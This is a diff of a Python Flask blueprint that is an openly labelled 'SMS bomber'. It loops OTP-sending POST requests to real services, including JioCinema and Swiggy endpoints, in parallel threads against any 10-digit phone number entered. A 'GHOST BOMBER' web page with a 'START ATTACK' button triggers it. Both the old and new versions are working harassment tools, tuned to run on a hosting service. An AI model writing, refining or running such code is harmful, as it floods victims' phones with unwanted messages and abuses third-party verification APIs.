@@ -1,41 +1,17 @@
-#!/usr/bin/env python3
-# -*- coding: utf-8 -*-
-
-"""
-script10.py – Flask Blueprint that offers:
-    * A JSON API (POST /bomb) – your existing “SMS bomber”.
-    * A friendly HTML page (GET /) – a quick form to fire the bomber from a browser.
-
-No changes are required in app.py – it still registers the blueprint with
-url_prefix="/script10".
-"""
-
-# ----------------------------------------------------------------------
-# Imports
-# ----------------------------------------------------------------------
 import time
 import threading
 import requests
 from concurrent.futures import ThreadPoolExecutor, as_completed
-
 from flask import Blueprint, request, jsonify, render_template_string
 
-# ----------------------------------------------------------------------
-# Configuration – tweak as needed
-# ----------------------------------------------------------------------
-TARGET_NUMBER = "9876543210"          # Default 10‑digit Indian number
-DELAY_BETWEEN_REQUESTS = 1.5          # Seconds between request batches
-MAX_THREADS = 5                       # Parallel requests per batch
-TOTAL_ATTACK_DURATION = 60            # Seconds to keep bombing
+# --- Config ---
+TARGET_NUMBER = "9876543210"
+DELAY_BETWEEN_REQUESTS = 2.0
+MAX_THREADS = 5
+TOTAL_ATTACK_DURATION = 30 # Render ke liye 30 safe hai
 
-# ----------------------------------------------------------------------
-# Blueprint
-# ----------------------------------------------------------------------
-sms_bomber_bp = Blueprint("sms_bomber", __name__)
+script10_bp = Blueprint("script10", __name__)
 
-# ----------------------------------------------------------------------
-# Service definitions – URLs, headers, and payload templates
-# ----------------------------------------------------------------------
 SERVICES = [
     {
         "name": "JioCinema",
@@ -54,147 +30,92 @@ SERVICES = [
         "url": "https://www.swiggy.com/dapi/user/send_otp",
         "headers": {"Content-Type": "application/json"},
         "payload_template": {"mobile_no": "{}"},
-    },
+    }
 ]
 
-# ----------------------------------------------------------------------
-# Helper functions
-# ----------------------------------------------------------------------
 def _send_otp(service, payload):
-    """Send a single OTP request and return a status string."""
     try:
-        resp = requests.post(
-            service["url"],
-            json=payload,
-            headers=service["headers"],
-            timeout=5,
-        )
-        if resp.status_code in (200, 201):
-            return f"[SUCCESS] {service['name']}"
-        if resp.status_code == 429:
-            return f"[RATE_LIMIT] {service['name']}"
-        return f"[INFO] {service['name']} – {resp.status_code}"
-    except Exception as exc:
-        return f"[ERROR] {service['name']} – {exc}"
+        resp = requests.post(service["url"], json=payload, headers=service["headers"], timeout=5)
+        return f"[{resp.status_code}] {service['name']}"
+    except:
+        return f"[FAIL] {service['name']}"
 
-def _build_payload(template, number):
-    """Replace the placeholder '{}' with the target number."""
-    return {
-        k: v.replace("{}", number) if isinstance(v, str) else v
-        for k, v in template.items()
-    }
-
-# ----------------------------------------------------------------------
-# Background worker that actually performs the bombing
-# ----------------------------------------------------------------------
-def bomb_worker(number: str):
-    """Run the bombing loop in a separate thread."""
-    results = []
+def bomb_worker(number):
     start = time.time()
     with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
-        futures = []
         while time.time() - start < TOTAL_ATTACK_DURATION:
             for svc in SERVICES:
-                payload = _build_payload(svc["payload_template"], number)
-                futures.append(executor.submit(_send_otp, svc, payload))
-            # Sleep inside the worker thread – the HTTP request is already finished
+                # Payload build logic
+                p = {k: v.replace("{}", number) if isinstance(v, str) else v for k, v in svc["payload_template"].items()}
+                executor.submit(_send_otp, svc, p)
             time.sleep(DELAY_BETWEEN_REQUESTS)
 
-        for fut in as_completed(futures):
-            results.append(fut.result())
-
-    # Persist or log the results somewhere if you need them
-    # For this demo we simply drop them – the API already returned earlier
-    return results
-
-# ----------------------------------------------------------------------
-# Routes
-# ----------------------------------------------------------------------
-@sms_bomber_bp.route("/", methods=["GET"])
+@script10_bp.route("/", methods=["GET"])
 def index():
-    """
-    A simple HTML UI.
-    The form POSTs to /bomb – the same endpoint that powers the API.
-    """
+    # Path dynamically handle karne ke liye logic
     html = """
     <!doctype html>
-    <html lang="en">
+    <html>
     <head>
-        <meta charset="utf-8">
-        <title>SMS Bomber</title>
+        <title>GHOST BOMBER V10</title>
         <style>
-            body{font-family:Arial,sans-serif;background:#f4f4f4;padding:2rem;}
-            form{max-width:400px;margin:auto;background:#fff;padding:1.5rem;border-radius:8px;}
-            label{display:block;margin:0.5rem 0 0.25rem;}
-            input{width:100%;padding:0.5rem;border:1px solid #ccc;border-radius:4px;}
-            button{margin-top:1rem;padding:0.5rem 1rem;background:#28a745;color:#fff;border:none;border-radius:4px;}
-            #output{margin-top:1rem;background:#eee;padding:1rem;border-radius:4px;font-family:monospace;}
+            body{ background: #000; color: #0f0; font-family: monospace; text-align: center; padding: 50px; }
+            .box{ border: 1px solid #0f0; padding: 20px; display: inline-block; border-radius: 10px; background: #111; }
+            input{ background: #000; border: 1px solid #0f0; color: #0f0; padding: 10px; margin: 10px; }
+            button{ background: #0f0; color: #000; border: none; padding: 10px 20px; cursor: pointer; font-weight: bold; }
         </style>
     </head>
     <body>
-        <h2>SMS Bomber UI</h2>
-        <form id="bombForm">
-            <label for="number">Phone number (10 digits, e.g. 9876543210)</label>
-            <input type="text" id="number" name="number" required>
-            <button type="submit">Bomb!</button>
-        </form>
-        <pre id="output"></pre>
+        <div class="box">
+            <h2>SMS BOMBER</h2>
+            <input type="text" id="num" placeholder="Enter 10 Digits" maxlength="10">
+            <br>
+            <button onclick="runBomb()">START ATTACK</button>
+            <p id="out"></p>
+        </div>
+
         <script>
-            const form = document.getElementById('bombForm');
-            const output = document.getElementById('output');
-            form.addEventListener('submit', async (e) => {
-                e.preventDefault();
-                output.textContent = '🚀 Sending…';
-                const data = new FormData(form);
-                const resp = await fetch('/script10/bomb', {
+            async function runBomb() {
+                const n = document.getElementById('num').value;
+                const out = document.getElementById('out');
+                if(n.length !== 10) return alert("Number sahi daal!");
+                
+                out.innerText = "Initializing Background Thread...";
+                
+                // Note: fetch path fixed to relative /bomb
+                const res = await fetch(window.location.pathname + "/bomb", {
                     method: 'POST',
-                    body: data
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ number: n })
                 });
-                const json = await resp.json();
-                output.textContent = JSON.stringify(json, null, 2);
-            });
+                const data = await res.json();
+                out.innerText = data.status + " for " + data.target;
+            }
         </script>
     </body>
     </html>
     """
     return render_template_string(html)
 
-@sms_bomber_bp.route("/bomb", methods=["POST"])
+@script10_bp.route("/bomb", methods=["POST"])
 def bomb():
-    """Trigger concurrent SMS bombing – runs in background to avoid worker timeout."""
     try:
-        # Accept form data or JSON
-        if request.is_json:
-            data = request.get_json()
-        else:
-            data = request.form
+        # JSON support fix
+        data = request.get_json(silent=True) or request.form
+        number = data.get("number", "").strip()
 
-        number = data.get("number", TARGET_NUMBER).strip()
-
-        # Validate 10‑digit number
         if not (number.isdigit() and len(number) == 10):
-            return jsonify({"error": "Invalid phone number – must be 10 digits."}), 400
+            return jsonify({"error": "Invalid 10-digit number"}), 400
 
-        # Start the worker thread – it will do the heavy lifting
-        thread = threading.Thread(
-            target=bomb_worker, args=(number,), daemon=True
-        )
+        # Background thread start
+        thread = threading.Thread(target=bomb_worker, args=(number,), daemon=True)
         thread.start()
 
-        # Return immediately – the bombing is running in the background
-        return jsonify(
-            {
-                "status": "Bombing started",
-                "target": number,
-                "duration_sec": TOTAL_ATTACK_DURATION,
-                "info": "Bombing runs in a background thread; check logs for results.",
-            }
-        )
+        return jsonify({
+            "status": "Bombing started in background",
+            "target": number,
+            "duration": TOTAL_ATTACK_DURATION
+        })
+    except Exception as e:
+        return jsonify({"error": str(e)}), 500
 
-    except Exception as exc:
-        return jsonify({"error": f"Unexpected error: {exc}"}), 500
-
-# ----------------------------------------------------------------------
-# Compatibility alias – used by app.py
-# ----------------------------------------------------------------------
-script10_bp = sms_bomber_bp   # <-- Fixed: no trailing dot
